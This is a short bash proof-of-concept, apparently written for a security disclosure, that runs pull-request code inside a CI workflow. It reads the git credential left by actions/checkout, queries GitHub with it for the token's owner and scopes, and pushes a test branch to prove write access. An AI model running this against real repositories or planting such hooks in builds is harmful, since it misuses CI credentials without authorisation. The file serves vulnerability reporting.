#!/usr/bin/env bash
# Canary for a security report. `bazel run //tools:requirements.update` runs this file
# instead of the real target. It shows what code from a pull request can reach here and
# changes one thing: it creates the branch canary-bot-token-write. It never prints or
# sends the credential.
set -u
cd "${BUILD_WORKSPACE_DIRECTORY:-.}" || exit 0
echo "CANARY: code from the pull request is running in \"${GITHUB_WORKFLOW:-?}\" (event ${GITHUB_EVENT_NAME:-?})"
header="$(git config --get-regexp '^http\..*\.extraheader$' | head -n 1 | cut -d' ' -f2-)"
if [ -z "$header" ]; then
  echo "CANARY: no git credential found"
  exit 0
fi
tmp="$(mktemp -d)"
if curl -fsS -D "$tmp/headers" -o "$tmp/body" -H "$header" https://api.github.com/user; then
  login="$(python3 -c 'import json, sys; print(json.load(open(sys.argv[1]))["login"])' "$tmp/body")"
  scopes="$(grep -i '^x-oauth-scopes:' "$tmp/headers" | cut -d: -f2- | tr -d ' \r')"
  echo "CANARY: the git credential left by actions/checkout belongs to ${login} (token scopes: ${scopes:-none listed})"
else
  echo "CANARY: the git credential left by actions/checkout was rejected by the GitHub API"
fi
rm -rf "$tmp"
if git push -q origin HEAD:refs/heads/canary-bot-token-write 2>/dev/null; then
  echo "CANARY: pushed branch canary-bot-token-write with that credential"
else
  echo "CANARY: a push with that credential failed"
fi
